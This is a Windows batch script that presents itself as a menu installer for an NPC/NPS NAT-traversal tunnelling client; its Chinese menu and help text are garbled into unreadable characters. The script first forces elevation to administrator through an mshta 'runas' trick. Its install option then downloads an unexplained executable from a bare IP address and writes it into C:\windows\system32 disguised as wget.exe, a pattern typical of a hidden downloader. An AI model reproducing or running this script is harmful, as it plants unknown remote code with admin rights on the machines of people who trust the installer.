%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit
@ECHO OFF&PUSHD %~DP0 &TITLE NGP2F
SETLOCAL EnableDelayedExpansion 
mode con cols=46 lines=32

color 9B
set "inviteListUrl=http://110.42.178.244:8888/down/Ygszx1myrod5.txt"  
set "loce=%~sdp0"
set "a_input="
set "scriptPath=%~dp0"    
set "scriptPath=!scriptPath:~0,-1!"  
set "newconfig=%loce%\config\1"
set "updateUrl=http://110.42.178.244:8888/down/oQHUdMZeaW7e.exe"
set "dateUrl=C:\windows\system32\wget.exe"
:menu

cls  
echo.  
echo    	���ߣ���ҽ-�Ϲ�    
echo 	��ϵQQ��2907613263  
echo ==============================================
echo ��ѡ��һ��ѡ�  
echo 1. ��װNPCNG��������  
echo 2. ��Ϊ����Aʹ��  
echo 3. ���¿ͻ��˺ͱ���
echo 4. ����м̷������ӳ�  
echo 5. HELP����ָ��  
echo 6. �˳��ű�
echo 7. ������������
echo 8. ���ڳ���
echo 9. �û�Э��
echo 10.���NAT����
echo -ʹ��ǰ����ϸ�Ķ�HELP����ָ���е�����-
echo !!ʹ��ǰ�뿴�û�Э�飬ʹ����Ĭ��ͬ��Э������!!
echo ==============================================
echo.  
  
set /p user_input="��������ţ�"  
if "%user_input%"=="1" (  
    echo ���ÿ���������......  
    cd /d "%loce%" 
    call npc.exe install  
    cd /d "C:\windows\system32"
    powershell curl -o "%dateUrl%" "%updateUrl%"

) else if "%user_input%"=="2" (  
    echo ��ʼ��������A��ز���...  
) else if "%user_input%"=="3" (  
    echo ���������....~
    cd /d "%scriptPath%" 
    start "" cmd /k call great.bat
) else if "%user_input%"=="4" (  
    echo ��ʼPING�м̷������ӳ�......  
    start "" ping /n 10 ngnd.qqwkt.top:8024 >nul  
) else if "%user_input%"=="5" (
cls
echo ��ѡ��һ��ѡ�
echo ==============================================
echo �����һ��ʹ�ã�������û�������κ������ļ�
echo ��������ƶ�����ʱ�޷�����ʹ�ã�����û������
echo �ƶ����ӵ������ļ������ҷ�����ĺ��ѻ�������
echo ���ƶ����÷����㡣
echo ������ǵ�һ��ʹ����Ϊ�������������ļ���
echo ==============================================
echo P2P��Ϊ���û���NAT���ͣ����Ժ��ѱ���������͸��
echo �������ں����汾���ṩFRP��֧����Щ�޷�������
echo ͸����ң�
echo ==============================================
echo �һ����Ĵ��������������ģ���Ϊ�ṩ�Ʒ�������
echo Ե��,Ϊ��Щ�޷�ʹ��P2P���û��ṩ��FRP��͸����
echo �պ���ܻ���ȡһ��������Ϊ�������Ĳ�����
echo ==============================================
echo ʹ�����������ӵ�ʱ����Ҫע�⣬��ע�ļ���ΪA��B
echo ��Ӣ����ĸ��ʹ���ƶ����õ������Ԥ�ƶ������ã�
echo �����θ�ΪA-Z���ļ����֣��ұ�֤�ļ���׺Ϊ.bat
echo ==============================================
echo �������޷���ͨ���볢��ִ��10�ļ��NAT���͡�
echo �������Ĵ���ѡ��[RFC 3489]����TEST���ȴ����
echo Public ��ȫû�����   
echo FullCone ���״�͸
echo RestrictedCone ���״�͸ 
echo PortRestrictedCone ��������
echo Symmetric ��ȫ����
echo ==============================================
echo ������й����£����������к�
echo ǰ�汾������C:\Program Files\nps\old
) else if "%user_input%"=="6" (  
    echo �˳��ű�...  
    exit /b  
) else if "%user_input%"=="7" ( 
        echo ����ʹ���ƶ�����... 
        cd /d "!newconfig!" 
        call run.bat
) else if "%user_input%"=="8" (  
cls
echo "  _   _                                    ";
echo " | \ | |  __ _  _ __    __ _  _   _   __ _ ";
echo " |  \| | / _` || '_ \  / _` || | | | / _` |";
echo " | |\  || (_| || | | || (_| || |_| || (_| |";
echo " |_| \_| \__,_||_| |_| \__, | \__,_| \__,_|";
echo "                       |___/               ";
echo ==============================================
echo �ó�������Ϊ��ҽ_�Ϲϣ�������������
echo ϵ����QQ:2907613263,������ζ������
echo עԭ������Ϣ,�����������������볢
echo ���ֶ����и�Ŀ¼�е�great.bat��������
echo �ļ��޸����������°�װ��
echo ==============================================
echo "  _   _   ____  ____  ____   _____ ";
echo " | \ | | / ___||  _ \|___ \ |  ___|";
echo " |  \| || |  _ | |_) | __) || |_   ";
echo " | |\  || |_| ||  __/ / __/ |  _|  ";
echo " |_| \_| \____||_|   |_____||_|    ";
echo "                                   ";
)else if "%user_input%"=="9" (
    start "" "%loce%\�û�Э��.pdf"
    echo ��ִ�д��û�Э��PDF�ļ�ָ��
)else if "%user_input%"=="10" (
    start "" "%loce%\NatTypeTester3.2.exe"
    echo ��ִ�д�NAT���
)

pause
goto menu
endlocal  

